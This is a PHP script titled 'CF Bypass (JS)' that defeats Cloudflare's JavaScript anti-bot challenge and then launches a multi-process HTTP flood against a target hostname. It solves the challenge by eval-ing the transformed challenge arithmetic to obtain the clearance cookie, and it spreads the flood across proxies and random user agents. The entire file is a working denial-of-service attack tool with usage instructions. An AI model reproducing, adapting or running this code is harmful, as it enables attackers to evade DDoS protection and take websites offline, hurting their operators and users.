<?php
	/**
	 * CF Bypass (JS)
	 *
	 * @author sizzuz
	 * @copyright Copyright &copy; sizzuz
	 *
	 */

	//ini_set('display_errors', 1);
	//error_reporting(E_ALL);
	 
	function do_curl($url, $useragent = '', $proxy = '', $header = false, $nobody = false, $followlocation = false, $cookie = '', $timeout = 30)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, !!$followlocation);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
		if ($header) curl_setopt($ch, CURLOPT_HEADER, true);
		if ($nobody) curl_setopt($ch, CURLOPT_NOBODY, true);
		if (strlen($useragent) > 0) curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
		if (strlen($proxy) > 0) curl_setopt($ch, CURLOPT_PROXY, $proxy);
		if (strlen($cookie) > 0) curl_setopt($ch, CURLOPT_COOKIE, $cookie);
		$result = curl_exec($ch);
		curl_close($ch);
		
		return $result;
	}
	
	function get_useragent()
	{
		//get random user agent
		$uas = array(	'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13C75 Safari/601.1',
						'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
						'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36',
						'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
						'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0',
						'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36',
						'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17',
						'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
						'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36',
						'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36',
						'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G920F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36',
						'Mozilla/5.0 (iPad; CPU OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1',
						'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36',
						'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1',
						'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54',
						'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0',
						'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E238 Safari/601.1',
						'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36 OPR/37.0.2178.54',
						'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
						'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36',
						'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36',
						'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
						'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
						'Mozilla/5.0 (X11; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
						'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36',
						'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
						'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
						'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1',
						'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
						'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
						'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
						'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36');
		return $uas[array_rand($uas)];
	}
	
	function get_proxy($filename, $line_length = 4096)
	{
		//get random line from file
		$random_line = '';
		if (file_exists($filename) && is_readable($filename))
		{
			//based on: http://stackoverflow.com/questions/12118995/how-to-echo-random-line-from-text-file
		    $handle = fopen($filename, 'r');
		    if ($handle)
		    {
		        $line = null;
		        $count = 0;
		        while (($line = fgets($handle, $line_length)) !== false)
		        {
		            $count++;
		            if ((mt_rand() % $count) == 0)
		            	$random_line = $line;
		        }
		        if (!feof($handle))	//unexpected fgets() fail
		        	$random_line = '';
		        fclose($handle);
		    }
		}
		
		return trim($random_line);
	}
	
	function to_php($s)
	{
		$s = (string) $s;
		
		//replace
		$s = preg_replace(array('/^\+/', '/\!\!\[\]/', '/\!\+\[\]/', '/\[\]/', '/\)\+\(/', '/\({2,}/', '/\){2,}/', '/\(\+/'), array('', '1', '1', '0', ')."".(', '(', ')', '('), $s);
		
		return $s;
	}
	
	function cfbypass($url, $useragent = '', $proxy = '')
	{
		$ret = array(	'success' => false,
						'msg' => '',
						'cookie' => array());
		
		$cookie = array();
		
		//get domain and scheme
		$url_parsed = parse_url($url);
		if (!is_array($url_parsed) || !isset($url_parsed['host']))
		{
			$ret['msg'] = 'cant determine domain';
			return $ret;
		}
		$url_domain = $url_parsed['host'];
		$url_scheme = (isset($url_parsed['scheme']) ? $url_parsed['scheme'] : 'http');
		
		//get
		$cfuam = do_curl($url, $useragent, $proxy, true, false, true);
		
		//is this UAM page?
		foreach (array('name="jschl_vc"', 'name="pass"', 'name="jschl_answer"', 'cloudflare-nginx') as $k)
		{
			if (strpos($cfuam, $k) === false)
			{
				$ret['msg'] = 'no CF UAM';
				return $ret;
			}
		}
		
		//get CF cookie
		if (!preg_match('/Set\-Cookie\: __cfduid\=([a-z0-9]+);/', $cfuam, $matches_cfuid))
		{
			$ret['msg'] = 'cant find cookie __cfduid';
			return $ret;
		}
		$cookie[] = '__cfduid='.$matches_cfuid[1];
		
		//get jschl_vc
		if (!preg_match('/\<input type\="hidden" name\="jschl_vc" value\="([a-z0-9]+)"\/\>/', $cfuam, $matches_jschl_vc))
		{
			$ret['msg'] = 'cant find jschl_vc value';
			return $ret;
		}
		$jschl_vc = $matches_jschl_vc[1];
		
		//get pass
		if (!preg_match('/\<input type\="hidden" name\="pass" value\="(.+)"\/\>/', $cfuam, $matches_pass))
		{
			$ret['msg'] = 'cant find pass value';
			return $ret;
		}
		$pass = $matches_pass[1];
		
		//find custom object
		if (!preg_match('/([a-zA-Z]+)\={"([a-zA-Z]+)"\:/', $cfuam, $matches_custom_object))
		{
			$ret['msg'] = 'cant find custom object';
			return $ret;
		}
		
		//find operations
		//initial
		$pattern = '/'.preg_quote($matches_custom_object[0], '/').'([\!\+\[\]\(\)]+)};'.'/';
		if (!preg_match($pattern, $cfuam, $matches_operations_initial))
		{
			$ret['msg'] = 'cant find operations initial';
			return $ret;
		}
		$operations_initial_string = $matches_operations_initial[1];
		//subsequent
		if (false === $p_start = strpos($cfuam, ';'.$matches_custom_object[1].'.'.$matches_custom_object[2]))
		{
			$ret['msg'] = 'cant find subsequent operations start';
			return $ret;
		}
		if (false === $p_end = strpos($cfuam, ';a.value = parseInt', $p_start))
		{
			$ret['msg'] = 'cant find subsequent operations end';
			return $ret;
		}
		$operations_subsequent_string = substr($cfuam, ($p_start + 1), ($p_end - $p_start));
		
		//transform operations to php
		//initial
		$operations_initial_string = to_php($operations_initial_string);
		//build eval
		$eval_string = '$m = '.$operations_initial_string.';$m = (int) $m;';
		//eval
		eval($eval_string);
		//subsequent
		$operations_subsequent_strings = explode(';', $operations_subsequent_string);
		array_pop($operations_subsequent_strings);
		foreach ($operations_subsequent_strings as $operations_subsequent_strings_item)
		{
			//remove object assignment
			$operations_subsequent_strings_item = substr($operations_subsequent_strings_item, strlen($matches_custom_object[1].'.'.$matches_custom_object[2]));
			//check if we have only expected characters
			if (!preg_match('/^[\+\-\*\=\!\[\]\(\)]+$/', $operations_subsequent_strings_item))
			{
				$ret['msg'] = 'invalid character(s) in subsequent operation';
				return $ret;
			}
			//remove and keep operation to follow up later on it
			$op = substr($operations_subsequent_strings_item, 0, 2);
			$operations_subsequent_strings_item = substr($operations_subsequent_strings_item, 2);
			//transform operations to php
			$operations_subsequent_strings_item = to_php($operations_subsequent_strings_item);
			//build eval
			$eval_string = '$m = '.$m.';$n = '.$operations_subsequent_strings_item.';$m '.$op.' (int) $n;';
			//eval
			eval($eval_string);
		}
		$jschl_answer = ($m + strlen($url_domain));
		
		//if we get here, we successfully calculated the answer
		$url_query = array(	'jschl_vc' => $jschl_vc,
							'pass' => $pass,
							'jschl_answer' => $jschl_answer);
		$cfchk_url = $url_scheme.'://'.$url_domain.'/cdn-cgi/l/chk_jschl?'.http_build_query($url_query);
		
		//get sleep time
		$sleep = 0;
		if (preg_match('/^\s*\}, (\d+)\);$/m', $cfuam, $matches_sleep))
			$sleep = (int) $matches_sleep[1];
		if ($sleep == 0) $sleep = 4000;
		usleep((($sleep * 1000) + 100000));
		
		//try to get clearance
		$cfchk = do_curl($cfchk_url, $useragent, $proxy, true, true, false, implode('; ', $cookie));
		if (!preg_match('/^Set\-Cookie\: cf_clearance\=(.+);/Um', $cfchk, $matches_cf_clearance))
		{
			$ret['msg'] = 'did not get clearance';
			return $ret;
		}
		$cookie['cf_clearance'] = 'cf_clearance='.$matches_cf_clearance[1];
		
		//return
		$ret = array(	'success' => true,
						'msg' => 'successfully bypassed',
						'cookie' => $cookie);
		
		return $ret;
	}
	
	echo PHP_EOL;
	echo 'CF Bypass (JS) by sizzuz'.PHP_EOL;
	echo 'Usage: <target hostname> <proxy file/nofile> <threads> <time>'.PHP_EOL;
	if (count($argv) < 5)
	{
		echo 'Error: Invalid parameters'.PHP_EOL;
		exit();
	}
	
	echo PHP_EOL;
	echo 'Starting flood on '.$argv[1].' for '.$argv[4].' seconds with '.$argv[3].' threads via proxies from file '.$argv[2].PHP_EOL;
	echo PHP_EOL;
	
	$cfbypass_debug = false;
	$url = $argv[1];
	$proxyfile = $argv[2];
	$threads = $argv[3];
	$expires = (time() + $argv[4]);
	
	for ($i = 1; $i <= $threads; $i++)
	{
		$pid = pcntl_fork();
		if ($pid == -1)
			echo 'Warning: Failed to fork thread '.$i.PHP_EOL;
		else if ($pid)
			continue;//pcntl_wait($status);
		else
		{
			echo 'OK: Started thread '.$i.'. Trying cf bypass...'.PHP_EOL;
			$useragent = get_useragent();
			$proxy = ($proxyfile == 'nofile' ? '' : get_proxy($proxyfile));
			if ($proxy == '' && $proxyfile != 'nofile')
				echo 'Warning: No proxy is set on thread '.$i.PHP_EOL;
				
			$cfbypass = cfbypass($url, $useragent, $proxy);
			if ($cfbypass_debug)
				print_r($cfbypass);
			if ($cfbypass['success'] === true)
			{
				echo 'OK: Thread '.$i.' CF bypassed. Starting flood...'.PHP_EOL;
				while ($expires >= time())
				{
					//randomize user agent
					$useragent = get_useragent();
					$flood = do_curl($url, $useragent, $proxy, false, false, true, implode('; ', $cfbypass['cookie']), 15);
				}
			}
			else
			{
				echo 'Error: Thread '.$i.' CF not bypassed ('.$cfbypass['msg'].')'.PHP_EOL;
			}
			echo 'OK: Closing thread '.$i.PHP_EOL;
			exit();
		}
	}
?>